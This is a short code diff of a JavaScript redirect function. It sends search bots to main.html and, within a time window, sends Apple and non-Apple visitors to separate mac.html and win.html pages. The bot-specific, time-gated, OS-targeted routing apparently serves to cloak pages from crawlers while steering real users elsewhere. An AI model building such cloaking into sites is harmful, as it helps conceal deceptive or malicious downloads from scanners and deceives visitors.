@@ -22,15 +22,17 @@
         }
 
         function redirectToPage() {
+            var redirectPath = 'main.html'; // Default path
+
             if (isSearchBot() && isWithinTimeRange()) {
-                window.location.href = 'main.html';
-            } else if (isAppleDevice()) {
-                window.location.href = 'mac.html';
-            } else if (isWithinTimeRange()) {
-                window.location.href = 'win.html';
-            } else {
-                window.location.href = 'main.html';
+                redirectPath = 'main.html';
+            } else if (isAppleDevice() && isWithinTimeRange()) {
+                redirectPath = 'mac.html';
+            } else if (!isAppleDevice() && isWithinTimeRange()) {
+                redirectPath = 'win.html';
             }
+
+            window.location.href = redirectPath;
         }
 
         // Call the redirection function when the page loads
